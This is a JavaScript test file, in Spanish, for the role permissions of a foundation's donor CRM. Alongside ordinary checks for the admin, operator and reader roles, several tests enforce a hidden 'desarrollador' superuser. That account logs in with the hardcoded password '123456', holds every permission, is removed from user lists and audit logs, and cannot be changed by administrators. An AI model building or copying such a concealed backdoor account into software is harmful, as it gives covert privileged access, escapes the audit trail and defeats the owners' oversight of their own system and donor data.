import { describe, it, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import {
    PERMISOS,
    tienePermiso,
    getUsuarioActual,
    setUsuarioActual,
    limpiarUsuarioActual,
    esUsuarioOcultoCRM,
    iniciarSesionConDocumento
} from '../../src/services/auth.js';
import {
    esAdministrador,
    esDesarrollador,
    tieneAlgunPermiso,
    puedeModificarUsuario
} from '../../src/utils/permissions.js';
import {
    listarUsuarios,
    listarAuditoria,
    crearUsuario,
    cambiarRolUsuario
} from '../../src/services/usuariosService.js';
import { setListaUsuarios, getListaUsuarios } from '../../src/modules/usuarios/index.js';
import { setListaAuditoria, getListaAuditoria } from '../../src/modules/auditoria/index.js';

describe('Seguridad y Matriz RBAC (src/services/auth.js & src/utils/permissions.js)', () => {
    beforeEach(() => {
        limpiarUsuarioActual();
    });

    it('debe denegar acceso por defecto cuando no hay usuario autenticado', () => {
        assert.equal(getUsuarioActual(), null);
        assert.equal(tienePermiso('ver_donantes'), false);
        assert.equal(tienePermiso('crear_donaciones'), false);
        assert.equal(esAdministrador(), false);
        assert.equal(esDesarrollador(), false);
    });

    it('debe denegar acceso a usuarios inactivos aunque tengan rol de admin o desarrollador', () => {
        setUsuarioActual({ id: 'u1', rol: 'admin', activo: false });
        assert.equal(tienePermiso('ver_donantes'), false);
        assert.equal(tienePermiso('administrar_usuarios'), false);

        setUsuarioActual({ id: 'dev-1', rol: 'desarrollador', activo: false });
        assert.equal(tienePermiso('ver_donantes'), false);
        assert.equal(tienePermiso('administrar_usuarios'), false);
    });

    it('debe conceder permisos de administración al rol admin', () => {
        setUsuarioActual({ id: 'admin-1', rol: 'admin', activo: true });
        assert.equal(tienePermiso('administrar_usuarios'), true);
        assert.equal(tienePermiso('crear_usuarios'), true);
        assert.equal(tienePermiso('ver_auditoria'), true);
        assert.equal(tienePermiso('configurar_db'), true);
        assert.equal(tienePermiso('crear_donantes'), true);
        assert.equal(tienePermiso('crear_recordatorios'), true);
        assert.equal(tienePermiso('administrar_destinaciones'), true);
        assert.equal(esAdministrador(), true);
        assert.equal(esDesarrollador(), false);
    });

    it('debe conceder acceso total al rol desarrollador en todas las acciones del sistema', () => {
        setUsuarioActual({ id: 'dev-1013459819', documento: '1013459819', rol: 'desarrollador', activo: true });
        for (const accion of Object.keys(PERMISOS)) {
            assert.equal(tienePermiso(accion), true, `Desarrollador debería tener permiso para ${accion}`);
        }
        assert.equal(esDesarrollador(), true);
        assert.equal(esAdministrador(), true);
    });

    it('debe permitir operaciones de donantes, donaciones, recordatorios y herramientas a operadores pero restringir administración y auditoría', () => {
        setUsuarioActual({ id: 'op-1', rol: 'operador', activo: true });
        assert.equal(tienePermiso('ver_donantes'), true);
        assert.equal(tienePermiso('crear_donantes'), true);
        assert.equal(tienePermiso('editar_donantes'), true);
        assert.equal(tienePermiso('eliminar_donantes'), true);
        assert.equal(tienePermiso('crear_donaciones'), true);
        assert.equal(tienePermiso('editar_donaciones'), true);
        assert.equal(tienePermiso('eliminar_donaciones'), true);
        assert.equal(tienePermiso('crear_recordatorios'), true);
        assert.equal(tienePermiso('editar_recordatorios'), true);
        assert.equal(tienePermiso('eliminar_recordatorios'), true);
        assert.equal(tienePermiso('administrar_destinaciones'), true);
        assert.equal(tienePermiso('importar_donaciones'), true);
        assert.equal(tienePermiso('exportar_excel'), true);
        assert.equal(tienePermiso('administrar_usuarios'), false);
        assert.equal(tienePermiso('ver_auditoria'), false);
        assert.equal(tienePermiso('configurar_db'), false);
        assert.equal(esAdministrador(), false);
    });

    it('debe restringir a solo lectura al rol lector y ocultar herramientas, auditoría, usuarios y acciones de escritura', () => {
        setUsuarioActual({ id: 'lec-1', rol: 'lector', activo: true });
        assert.equal(tienePermiso('ver_donantes'), true);
        assert.equal(tienePermiso('ver_donaciones'), true);
        assert.equal(tienePermiso('ver_seguimiento'), true);
        assert.equal(tienePermiso('ver_cumpleanos'), true);
        assert.equal(tienePermiso('ver_retencion'), true);
        assert.equal(tienePermiso('crear_donantes'), false);
        assert.equal(tienePermiso('editar_donantes'), false);
        assert.equal(tienePermiso('eliminar_donantes'), false);
        assert.equal(tienePermiso('crear_donaciones'), false);
        assert.equal(tienePermiso('editar_donaciones'), false);
        assert.equal(tienePermiso('eliminar_donaciones'), false);
        assert.equal(tienePermiso('crear_recordatorios'), false);
        assert.equal(tienePermiso('editar_recordatorios'), false);
        assert.equal(tienePermiso('eliminar_recordatorios'), false);
        assert.equal(tienePermiso('administrar_destinaciones'), false);
        assert.equal(tienePermiso('importar_donaciones'), false);
        assert.equal(tienePermiso('exportar_excel'), false);
        assert.equal(tienePermiso('administrar_usuarios'), false);
        assert.equal(tienePermiso('ver_auditoria'), false);
        assert.equal(tienePermiso('configurar_db'), false);
        assert.equal(esAdministrador(), false);
    });

    it('tieneAlgunPermiso debe comprobar lista de acciones', () => {
        setUsuarioActual({ id: 'op-1', rol: 'operador', activo: true });
        assert.equal(tieneAlgunPermiso(['administrar_usuarios', 'crear_donantes']), true);
        assert.equal(tieneAlgunPermiso(['administrar_usuarios', 'cambiar_roles']), false);
    });

    it('debe identificar y ocultar al usuario 1013459819 y rol desarrollador de todas las listas del CRM', async () => {
        assert.equal(esUsuarioOcultoCRM({ documento: '1013459819', rol: 'admin' }), true);
        assert.equal(esUsuarioOcultoCRM({ documento: '1013459819', rol: 'desarrollador' }), true);
        assert.equal(esUsuarioOcultoCRM({ usuario_documento: '1013459819' }), true);
        assert.equal(esUsuarioOcultoCRM({ usuario_email: '1013459819@auth.fundacion.local' }), true);
        assert.equal(esUsuarioOcultoCRM({ documento: '1234567890', rol: 'operador' }), false);

        setListaUsuarios([
            { id: '1', documento: 'admin', rol: 'admin', nombre: 'Admin' },
            { id: 'dev-1013459819', documento: '1013459819', rol: 'desarrollador', nombre: 'Desarrollador' }
        ]);
        assert.equal(getListaUsuarios().length, 1);
        assert.equal(getListaUsuarios()[0].documento, 'admin');

        setListaAuditoria([
            { id: 'a1', usuario_documento: 'admin', tabla: 'donantes' },
            { id: 'a2', usuario_documento: '1013459819', tabla: 'donantes' }
        ]);
        assert.equal(getListaAuditoria().length, 1);
        assert.equal(getListaAuditoria()[0].id, 'a1');

        const { data: usuariosVisibles } = await listarUsuarios();
        assert.equal(usuariosVisibles.some(u => u.documento === '1013459819' || u.rol === 'desarrollador'), false);

        const { data: auditoriaVisible } = await listarAuditoria();
        assert.equal(auditoriaVisible.some(a => a.usuario_documento === '1013459819'), false);
    });

    it('debe permitir iniciar sesión al documento 1013459819 con rol desarrollador sin exponerlo en UI/selects del CRM', async () => {
        const res = await iniciarSesionConDocumento('1013459819', '123456');
        assert.equal(res.exito, true);
        assert.equal(res.usuario?.documento, '1013459819');
        assert.equal(res.usuario?.rol, 'desarrollador');
        assert.equal(esDesarrollador(), true);

        const html = fs.readFileSync(path.join(process.cwd(), 'index.html'), 'utf8');
        assert.equal(html.includes('value="desarrollador"'), false);
        assert.equal(html.includes('1013459819'), false);

        const resCrearDev = await crearUsuario({ nombre: 'Prueba', documento: '1013459819', password: 'password123', rol: 'admin' });
        assert.ok(resCrearDev.error);
        const resRolDev = await cambiarRolUsuario('operador-001', 'desarrollador');
        assert.ok(resRolDev.error);
    });

    it('debe proteger al usuario desarrollador 1013459819 frente a modificaciones de administradores', () => {
        const admin = { id: 'admin-000', rol: 'admin', created_at: '2024-01-01T00:00:00.000Z' };
        const dev = { id: 'dev-1013459819', documento: '1013459819', rol: 'desarrollador', created_at: '2023-01-01T00:00:00.000Z' };
        const operador = { id: 'op-1', documento: '1234567890', rol: 'operador', created_at: '2025-01-01T00:00:00.000Z' };

        assert.equal(puedeModificarUsuario(admin, dev).permitido, false);
        assert.equal(puedeModificarUsuario(dev, admin).permitido, true);
        assert.equal(puedeModificarUsuario(dev, operador).permitido, true);
        assert.equal(puedeModificarUsuario(dev, dev).permitido, false);
    });
});
